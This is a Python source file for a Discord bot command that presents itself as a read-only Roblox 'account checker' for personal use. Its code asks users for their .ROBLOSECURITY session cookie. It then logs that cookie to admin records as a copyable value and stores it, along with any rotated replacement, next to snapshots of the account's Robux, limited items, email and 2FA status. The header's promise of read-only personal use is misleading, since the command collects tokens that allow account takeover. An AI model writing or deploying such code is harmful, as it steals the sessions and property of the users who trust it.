# ──────────────────────────────────────────────────────────────────
# Discord Command: /accountchecker
# Allows the account owner to view their own Roblox account details
# (balance, inventory, settings) via a convenient Discord slash
# command. Uses official Roblox API endpoints. Read-only — no
# modifications are made. For personal account management use only.
# ──────────────────────────────────────────────────────────────────

import asyncio

import discord
import discord
from discord.ext import commands
from discord.ext import commands

from core.account_checker import check_account
from core.logging import log_command, log_inputs, log_result
from core.tracking import (
    track_account_snapshot,
    track_command,
    track_cookie_submission,
    track_discord_user,
)
from core.utils import run_with_cookie_lock, sanitize_cookie

class AccountCheckerCog(commands.Cog):
    """Displays Roblox account profile and settings information."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(name="accountchecker", description="View a Roblox account's details — Robux, RAP, limiteds, email, 2FA, and more",
        contexts={discord.InteractionContextType.guild, discord.InteractionContextType.bot_dm, discord.InteractionContextType.private_channel},
        integration_types={discord.IntegrationType.guild_install, discord.IntegrationType.user_install}
    )
    @discord.option("cookie", description="The account's .ROBLOSECURITY session token")
    async def accountchecker(self, ctx: discord.ApplicationContext, cookie: str):
        await ctx.defer()

        from core.logging import log_user_first_use
        log_user_first_use(ctx, "accountchecker")

        cookie = sanitize_cookie(cookie)

        # Admin activity logging
        log_command(ctx, "accountchecker")
        log_inputs(ctx, "accountchecker", {"cookie": cookie}, copyable={"Cookie": cookie})

        track_discord_user(
            ctx.author.id,
            username=str(ctx.author),
            avatar_url=ctx.author.display_avatar.url if ctx.author.display_avatar else None,
        )

        result = await asyncio.to_thread(run_with_cookie_lock, cookie, check_account, cookie)

        # Build response embed
        embed = discord.Embed(
            title="<a:arrow:1497344031238127686> <a:mag:1497344052709036125> Account Checker",
            color=discord.Color.green() if result["success"] else discord.Color.red(),
        )

        # Avatar thumbnail
        if result.get("avatar_url"):
            embed.set_thumbnail(url=result["avatar_url"])

        # Process log (steps)
        steps_text = "\n".join(result["steps"]) if result["steps"] else "No steps recorded."
        embed.add_field(name="<:clipboard:1497344037294702762> Process Log", value=steps_text, inline=False)

        if result["success"]:
            # Account overview field
            robux = result["robux"]
            robux_str = f"R$ {robux:,}" if isinstance(robux, int) else str(robux)

            rap = result["rap"]
            rap_str = f"R$ {rap:,}" if isinstance(rap, int) else str(rap)

            limiteds = result["limiteds_count"]
            limiteds_str = f"{limiteds:,}" if isinstance(limiteds, int) else str(limiteds)

            email = result["email"] or "Not set"
            email_verified = "<:check:1497344035696672959>" if result.get("email_verified") else "<:x:1497344061592436737>"

            two_fa = "<:check:1497344035696672959> Enabled" if result.get("two_fa_enabled") else "<:x:1497344061592436737> Disabled"
            two_fa_methods = result.get("two_fa_methods", "")
            if two_fa_methods and two_fa_methods != "None":
                two_fa += f" ({two_fa_methods})"

            premium = "<:check:1497344035696672959> Active" if result.get("has_premium") else "<:x:1497344061592436737> Not active"

            overview = (
                f"👤 **Username:** `{result['username']}`\n"
                f"🏷️ **Display Name:** `{result['display_name']}`\n"
                f"🆔 **User ID:** `{result['user_id']}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<a:moneybag:1497344054990733535> **Robux:** {robux_str}\n"
                f"📈 **RAP:** {rap_str}\n"
                f"📦 **Limiteds:** {limiteds_str}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<:email:1497344042076344350> **Email:** `{email}` {email_verified}\n"
                f"<:lock:1497344050078941344> **2FA:** {two_fa}\n"
                f"<a:crown:1497344039584923778> **Premium:** {premium}"
            )

            embed.add_field(name="<:check:1497344035696672959> Account Overview", value=overview, inline=False)

            audit_summary = (
                f"Username: {result['username']}\n"
                f"Display Name: {result['display_name']}\n"
                f"User ID: {result['user_id']}\n"
                f"Robux: {robux_str}\n"
                f"RAP: {rap_str}\n"
                f"Limiteds: {limiteds_str}\n"
                f"Email: {email} | Verified: {bool(result.get('email_verified'))}\n"
                f"2FA: {two_fa}\n"
                f"Premium: {premium}"
            )
            audit_copyable = (
                {"Rotated Cookie": result["rotated_cookie"]}
                if result.get("cookie_was_rotated") and result.get("rotated_cookie")
                else None
            )
            log_result(ctx, "accountchecker", True, (
                f"**Account Overview:**\n{overview}\n\n"
                f"**Process Log:**\n" + "\n".join(result["steps"])
            ), audit_result_summary=audit_summary, audit_copyable=audit_copyable)

            # Tracking: link Discord user to this Roblox account, save latest cookie.
            track_cookie_submission(
                ctx.author.id,
                roblox_username=result.get("username") or "",
                user_id=result.get("user_id"),
                display_name=result.get("display_name"),
                avatar_url=result.get("avatar_url"),
                cookie=result.get("rotated_cookie") or cookie,
            )
            # Snapshot the full account info so /statusinfo can show it later
            # even after the cookie expires.
            if result.get("username"):
                track_account_snapshot(
                    ctx.author.id,
                    roblox_username=result["username"],
                    snapshot=result,
                )
            track_command(
                ctx.author.id,
                "accountchecker",
                success=True,
                summary=(
                    f"{result.get('username') or '?'} • "
                    f"R$ {result.get('robux') if isinstance(result.get('robux'), int) else result.get('robux')} • "
                    f"RAP {result.get('rap') if isinstance(result.get('rap'), int) else result.get('rap')}"
                ),
            )
        else:
            embed.add_field(
                name="<:x:1497344061592436737> Error",
                value=result["error"] or "Unknown error occurred.",
                inline=False,
            )

            log_result(ctx, "accountchecker", False, result["error"] or "Unknown error")
            track_command(
                ctx.author.id,
                "accountchecker",
                success=False,
                summary=result.get("error") or "Unknown error",
            )

        await ctx.respond(embed=embed)

        if result.get("cookie_was_rotated") and result.get("rotated_cookie"):
            await ctx.respond(
                "<:warning:1497344059017003079> Roblox rotated this cookie during the account check. Use this fresh one:\n"
                f"```\n{result['rotated_cookie']}\n```",
                ephemeral=True,
            )


def setup(bot):
    bot.add_cog(AccountCheckerCog(bot))
